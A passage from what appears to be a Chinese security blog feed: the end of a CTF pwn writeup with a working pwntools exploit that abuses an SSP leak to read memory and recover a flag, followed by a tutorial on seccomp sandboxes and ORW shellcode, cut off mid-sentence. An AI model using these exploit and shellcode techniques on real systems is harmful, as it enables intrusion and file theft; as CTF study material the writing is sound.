operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span><span class="token comment"># PWN 远程 : content = 0, PWN 本地 : content = 1</span>content <span class="token operator">=</span> <span class="token number">1</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/opt/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so"</span><span class="token punctuation">)</span><span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span><span class="token comment"># 将本地的 Linux 程序启动为进程 io</span>    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span><span class="token comment"># 附加 gdb 调试</span><span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>cmd<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>   <span class="token comment"># 只有本地才可调试，远程无法调试</span>        gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span>        pause<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 用 read_got_addr 覆盖 __libc_argv[0] 泄露 read 函数的真实地址</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"What's your name?\n"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"uf4te"</span><span class="token punctuation">)</span>read_got_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'What do you want to do?\n'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x128</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>read_got_addr<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'*** stack smashing detected ***: '</span><span class="token punctuation">)</span>read_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"read_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>read_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 根据 read 函数的真实地址计算 libc 基地址，同时得到 environ 的真实地址</span>libcbase <span class="token operator">=</span> read_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>environ_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'environ'</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"environ_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>environ_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 用 environ 的真实地址覆盖 __libc_argv[0] 泄露栈上环境变量的首地址</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"What's your name?\n"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"uf4te"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'What do you want to do?\n'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x128</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>environ_addr<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'*** stack smashing detected ***: '</span><span class="token punctuation">)</span>stack_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"stack_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>stack_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 由于栈上环境变量的首地址与 flag 在栈上的位置相距 0x178，计算 flag 在栈上的真实地址</span>flag_addr <span class="token operator">=</span> stack_addr <span class="token operator">-</span> <span class="token number">0x178</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"flag_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>flag_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 用 flag 在栈上的真实地址覆盖 __libc_argv[0] 泄露加密后的 flag</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"What's your name?\n"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"uf4te"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'Your random id is: '</span><span class="token punctuation">)</span><span class="token comment"># 由于 flag 的加密与生成的随机数有关，注意到这个随机数是不变的，获取随机数</span>random <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\n'</span><span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token string">b'\n'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"random id -->"</span><span class="token punctuation">,</span> random<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'What do you want to do?\n'</span><span class="token punctuation">)</span><span class="token comment"># debug()</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x128</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>flag_addr<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'*** stack smashing detected ***: '</span><span class="token punctuation">)</span>flag_enc <span class="token operator">=</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"flag_enc -->"</span><span class="token punctuation">,</span> flag_enc<span class="token punctuation">)</span><span class="token comment"># flag 的加密是简单的异或，因此异或解密还原 flag</span>flag <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>flag_enc<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> random<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment"># 与远程交互</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%8D%8E%E4%B8%BA%E6%9D%AF2023-ez_ssp20.png" alt="华为杯2023-ez_ssp20.png"></p>]]></content>
    
    
    <summary type="html">利用 SSP Leak 绕过 Canary，通过修改 __fortify_fail 函数中要输出的变量 __libc_argv[0] 的地址，故意触发 Canary 保护来实现任意地址读</summary>
    
    
    
    <category term="二进制漏洞利用" scheme="https://www.uf4te.cn/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
    
    <category term="Pwn" scheme="https://www.uf4te.cn/tags/Pwn/"/>
    
    <category term="Writeup" scheme="https://www.uf4te.cn/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>沙箱绕过与ORW</title>
    <link href="https://www.uf4te.cn/posts/7a9990fc.html"/>
    <id>https://www.uf4te.cn/posts/7a9990fc.html</id>
    <published>2024-05-12T02:53:41.000Z</published>
    <updated>2024-06-05T06:37:14.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="沙箱"><a href="#沙箱" class="headerlink" title="沙箱"></a>沙箱</h1><blockquote><p>沙箱技术是一种安全机制，目的在于为执行中的程序提供隔离环境，可以将沙箱理解为是一个虚拟系统程序，它创造了一个类似沙箱的独立作业环境，并且会把所有操作记录下来，在其内部运行的程序并不能对硬盘产生永久性的影响</p><p>沙箱是一个独立的虚拟环境，通过拦截系统调用，监视程序行为，可以用来测试不受信任的应用程序或上网行为</p></blockquote><hr><h2 id="沙箱和虚拟机的区别"><a href="#沙箱和虚拟机的区别" class="headerlink" title="沙箱和虚拟机的区别"></a>沙箱和虚拟机的区别</h2><blockquote><p>从表面和目的上来看，沙箱有点类似于物理主机和虚拟机之间的关系，但是它们之间并不完全等价</p><p>参考文章：<a href="https://blog.csdn.net/syy15270341019/article/details/133036033">沙箱和虚拟机的区别-CSDN博客</a></p></blockquote><ul><li>沙箱</li></ul><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E4%B8%8EORW1.png" alt="沙箱绕过与ORW1.png"></p><ol><li><p>沙箱是在现有的系统下，虚拟文件系统和注册表，通过底层驱动虚拟硬盘等操作，让你在虚拟的软件环境中运行应用程序</p></li><li><p>沙箱中的应用程序和其它应用程序共享机器的硬件资源，对系统资源消耗较少</p></li><li><p>当沙箱中的应用程序退出后，其所做的更改会被丢弃</p></li><li><p>沙箱在进行软件测试时，沙箱会接管病毒调用接口或函数的行为，并会在确认为病毒行为后实行回滚机制，让系统复原</p></li><li><p>沙箱一般来说是不能运行需要驱动加载的软件的</p></li></ol><ul><li>虚拟机</li></ul><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E4%B8%8EORW2.png" alt="沙箱绕过与ORW2.png"></p><ol><li><p>虚拟机是通过软件手段虚拟计算机的硬件设备，在现有的系统下建立一个全新的系统环境，在没有进行设置前，该系统环境无法与现有系统相互访问</p></li><li><p>虚拟机不和其它应用程序共享硬件资源，因此虚拟机对系统资源消耗较大</p></li><li><p>当虚拟机退出后，其所做的更改会被保存下来</p></li><li><p>虚拟机不具备回滚复原机制，在激发病毒后，虚拟机会根据病毒的行为特征判断为是某一类病毒，并调用引擎对该病毒进行清除</p></li><li><p> 虚拟机可以运行在正常系统下可以运行的软件，它可以享有属于自身的驱动程序</p></li></ol><blockquote><p>相对来说，虚拟机的安全性更高、技术比较稳定，很少有病毒可以攻破虚拟机使主机中毒</p><p>除此之外，虚拟机的用途更广泛</p></blockquote><hr><h2 id="沙箱保护的种类"><a href="#沙箱保护的种类" class="headerlink" title="沙箱保护的种类"></a>沙箱保护的种类</h2><blockquote><p>参考文章：<a href="https://xz.aliyun.com/t/12787?time__1311=mqmhDvrxkG8D/D0lD2DUh9Cr4cC+eD&alichlgref=https://www.google.com/">栈沙箱学习之orw - 先知社区</a></p></blockquote><p>在程序中通常会使用一个函数来创建沙箱，例如使用 <code>sandbox()</code> 函数开启沙箱保护</p><p><code>sandbox()</code> 函数通常有两种方式开启沙箱：<code>prctl</code> 函数调用、<code>seccomp</code> 库函数</p><blockquote><p>沙箱保护一般都会限制 <code>execve</code> 的系统调用，例如 <code>one_gadget</code> 和 <code>system</code> 调用，使我们不能正常 <code>get shell</code>，只能通过 ROP 调用 <code>open()</code>、<code>read()</code>、<code>write()</code> 的组合方式来获取 flag</p><p>当然，为了提高难度，有时候 <code>open()</code>、<code>read()</code>、<code>write()</code> 的组合也会被部分禁用</p></blockquote><ul><li>使用 <code>prctl()</code> 方式开启的沙箱</li></ul><p>函数定义如下：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/prctl.h></span></span><span class="token keyword">int</span> <span class="token function">prctl</span><span class="token punctuation">(</span><span class="token keyword">int</span> option<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> arg2<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> arg3<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> arg4<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> arg5<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>主要关注 <code>prctl()</code> 函数的第一个参数，<code>option</code> 的值代表被禁用的函数黑名单</p><ol><li><code>prctl(38, 1LL, 0LL, 0LL, 0LL)</code></li></ol><p>当第一个参数为 38 时，表示禁用系统调用</p><p>第二个参数设置为 1，则禁用 execve 系统调用，对子进程同样生效</p><ol start="2"><li><code>prctl(22，2, &amp;v1)</code></li></ol><p>当第一个参数为 22 时，表示设置沙箱规则，从而可以实现改变函数的系统调用</p><p>第二个参数设置为 1，只允许调用 <code>read</code>、<code>write</code>、<code>_exit(not exit_group)</code>、<code>sigreturn</code> 这几个 <code>syscall</code></p><p>第二个参数设置为 2，过滤模式，通过参数 3 的结构体自定义过滤规则来对 <code>syscall</code> 进行限制</p><ul><li>使用 <code>seccomp()</code> 函数调用开启的沙箱</li></ul><p>函数定义如下：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 <span class="token function">sandbox</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 v1<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-8h]</span>  <span class="token comment">// 这里介绍两个重要的宏，SCMP_ACT_ALLOW(0x7fff0000U) 和 SCMP_ACT_KILL( 0x00000000U)</span>  <span class="token comment">// seccomp 初始化，参数为 0 表示白名单模式，参数为 0x7fff0000U 则为黑名单模式</span>  v1 <span class="token operator">=</span> <span class="token function">seccomp_init</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>v1 <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"seccomp error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">// seccomp_rule_add 添加规则</span>  <span class="token comment">// v1 对应上面初始化的返回值</span>  <span class="token comment">// 0x7fff0000 即对应宏 SCMP_ACT_ALLOW</span>  <span class="token comment">// 第三个参数代表对应的系统调用号，0-->read / 1-->write / 2-->open / 60-->exit</span>  <span class="token comment">// 第四个参数表示是否需要对对应系统调用的参数做出限制以及指示做出限制的个数，传 0 不做任何限制</span>  <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> <span class="token number">0x7FFF0000LL</span><span class="token punctuation">,</span> <span class="token number">2LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> <span class="token number">0x7FFF0000LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> <span class="token number">0x7FFF0000LL</span><span class="token punctuation">,</span> <span class="token number">1LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> <span class="token number">0x7FFF0000LL</span><span class="token punctuation">,</span> <span class="token number">60LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> <span class="token number">0x7FFF0000LL</span><span class="token punctuation">,</span> <span class="token number">231LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// seccomp_load -> 将当前 seccomp 过滤器加载到内核中</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">seccomp_load</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token comment">// seccomp_release -> 释放 seccomp 过滤器状态</span>    <span class="token comment">// 但对已经 load 的过滤规则不影响</span>    <span class="token function">seccomp_release</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"seccomp error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token function">seccomp_release</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="沙箱保护的识别"><a href="#沙箱保护的识别" class="headerlink" title="沙箱保护的识别"></a>沙箱保护的识别</h2><p>使用工具 <code>seccomp-tools</code> 可以识别二进制程序是否开启了沙箱，并且禁止了哪些系统调用</p><p>安装 <code>seccomp-tools</code>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> gcc ruby-devgem <span class="token function">install</span> seccomp-tools<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>使用方法：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">seccomp-tools dump 二进制程序<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E4%B8%8EORW3.png" alt="沙箱绕过与ORW3.png"></p><p>重点注意最后的两句：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">0004: 0x06 0x00 0x00 0x00000000  <span class="token builtin class-name">return</span> KILL0005: 0x06 0x00 0x00 0x7fff0000  <span class="token builtin class-name">return</span> ALLOW<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>通过 <code>goto</code> 跳转的地址可以判断哪些系统调用是被禁止的，比如这里是禁用了 <code>execve</code></p><hr><h1 id="ORW"><a href="#ORW" class="headerlink" title="ORW"></a>ORW</h1><blockquote><p>顾名思义，就是 <code>open</code>、<code>read</code>、<code>write</code>：打开文件，将文件内容读取存储到某个位置，将文件内容打印出来</p><p><mark>这种方法不能获取 shell，但可以实现任意地址读和任意地址写</mark></p><p><strong>由于 <code>open()</code> 函数打开文件需要传入一个文件名，因此我们可能需要先在某个地址处写入文件名 <code>b&#39;/flag\x00&#39;</code>，然后将其地址作为参数传给 <code>open()</code> 函数</strong></p></blockquote><ul><li>32 位 ORW 系统调用号：</li></ul><table><thead><tr><th align="left">eax</th><th align="left">system call</th><th align="left">ebx</th><th align="left">ecx</th><th align="left">edx</th><th></th></tr></thead><tbody><tr><td align="left">3</td><td align="left"><code>read()</code></td><td align="left">unsigned int fd</td><td align="left">char *buf</td><td align="left">size_t count</td><td></td></tr><tr><td align="left">4</td><td align="left"><code>write()</code></td><td align="left">unsigned int fd</td><td align="left">const char *buf</td><td align="left">size_t count</td><td></td></tr><tr><td align="left">5</td><td align="left"><code>open()</code></td><td align="left">const char *filename</td><td align="left">int flags</td><td align="left">int mode</td><td></td></tr></tbody></table><p>其它类似功能的函数也是可以使用的，例如：<code>fopen()</code>、<code>fwrite()</code>，具体根据函数的传参调整寄存器即可</p><p>更多 32 位 syscall 格式见：<a href="https://github.com/torvalds/linux/blob/16f73eb02d7e1765ccab3d2018e0bd98eb93d973/arch/x86/entry/syscalls/syscall_32.tbl">linux&#x2F;syscall_32.tbl · torvalds&#x2F;linux · GitHub</a></p><ul><li>64 位 ORW 系统调用号：</li></ul><table><thead><tr><th align="left">rax</th><th align="left">system call</th><th align="left">rdi</th><th align="left">rsi</th><th align="left">rdx</th></tr></thead><tbody><tr><td align="left">0</td><td align="left"><code>read()</code></td><td align="left">unsigned int fd</td><td align="left">char *buf</td><td align="left">size_t count</td></tr><tr><td align="left">1</td><td align="left"><code>write()</code></td><td align="left">unsigned int fd</td><td align="left">const char *buf</td><td align="left">size_t count</td></tr><tr><td align="left">2</td><td align="left"><code>open()</code></td><td align="left">const char *filename</td><td align="left">int flags</td><td align="left">int mode</td></tr></tbody></table><p>其它类似功能的函数也是可以使用的，例如：<code>fopen()</code>、<code>fwrite()</code>、<code>open64()</code>，具体根据函数的传参调整寄存器即可</p><p>更多 64 位 syscall 格式见：<a href="https://github.com/torvalds/linux/blob/16f73eb02d7e1765ccab3d2018e0bd98eb93d973/arch/x86/entry/syscalls/syscall_64.tbl">linux&#x2F;syscall_64.tbl · torvalds&#x2F;linux · GitHub</a></p><hr><h2 id="Shellcode-型"><a href="#Shellcode-型" class="headerlink" title="Shellcode 型"></a>Shellcode 型</h2><blockquote><p><strong>适用于程序没有 NX 保护的时候</strong>，我们可以直接将指令写到栈上并执行</p><p>不过现在程序不开 NX 保护的情况几乎很少了，所以这种方法了解一下就好</p></blockquote><h3 id="32-位-ORW-构造"><a href="#32-位-ORW-构造" class="headerlink" title="32 位 ORW 构造"></a>32 位 ORW 构造</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># fd = open('/flag', 0) </span>ORW <span class="token operator">=</span> <span class="token triple-quoted-string string">''' xor edx,edx; mov ecx,0; mov ebx,0x804a094; mov eax,5; int 0x80; '''</span><span class="token comment"># read(fd, 0x804a094, 0x50) </span>ORW <span class="token operator">+=</span> <span class="token triple-quoted-string string">''' mov edx,0x50; mov ecx,ebx; mov ebx,eax; mov eax,3; int 0x80; '''</span><span class="token comment"># write(1, 0x804a094, 0x50) </span>ORW <span class="token operator">+=</span> <span class="token triple-quoted-string string">''' mov edx,0x50; mov ebx,1; mov eax,4; int 0x80; '''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果对汇编语言不熟悉，也可以利用 Pwntools 的 <code>shellcraft</code> 模块生成：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 声明程序架构为 32 位</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span><span class="token comment"># 打开本地的flag文件</span>ORW <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 文件描述符3：其它打开的文件，将 flag 内容写入到 data_address 地址处</span>ORW <span class="token operator">+=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> data_address<span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 文件描述符1：输出到屏幕，打印地址 data_address 处存储的 flag 内容</span>ORW <span class="token operator">+=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> data_address<span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="64-位-ORW-构造"><a href="#64-位-ORW-构造" class="headerlink" title="64 位 ORW 构造"></a>64 位 ORW 构造</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># fd = open('/flag', 0) </span>ORW <span class="token operator">=</span> <span class="token triple-quoted-string string">''' xor rdx,rdx; mov rsi,0; mov rdi,0x804a094; mov rax,2; syscall; '''</span><span class="token comment"># read(fd, 0x804a094, 0x50) </span>ORW <span class="token operator">+=</span> <span class="token triple-quoted-string string">''' mov rdx,0x50; mov rsi,rdi; mov rdi,rax; mov rax,0; syscall; '''</span><span class="token comment"># write(1, 0x804a094, 0x50) </span>ORW <span class="token operator">+=</span> <span class="token triple-quoted-string string">''' mov rdx,0x50; mov rdi,1; mov rax,1; syscall; '''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果对汇编语言不熟悉，也可以利用 Pwntools 的 <code>shellcraft</code> 模块生成：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 声明程序架构为 64 位</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span><span class="token comment"># 打开本地的flag文件</span>ORW <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 文件描述符3：其它打开的文件，将 flag 内容写入到 data_address 地址处</span>ORW <span class="token operator">+=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> data_address<span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 文件描述符1：输出到屏幕，打印地址 data_address 处存储的 flag 内容</span>ORW <span class="token operator">+=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> data_address<span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="ROP-型"><a href="#ROP-型" class="headerlink" title="ROP 型"></a>ROP 型</h2><blockquote><p>如果程序开启了 NX 保护，那么 Shellcode 型 ORW 就失效了</p><p>因此，<strong>相对来说，这种 ROP 的方式实用性更广一些</strong></p></blockquote><h3 id="32-位-ORW-构造-1"><a href="#32-位-ORW-构造-1" class="headerlink" title="32 位 ORW 构造"></a>32 位 ORW 构造</h3><blockquote><p>注意：32 位程序在传参时栈上会多出一个返回地址 <code>back_addr</code></p><p><em>我们可以将 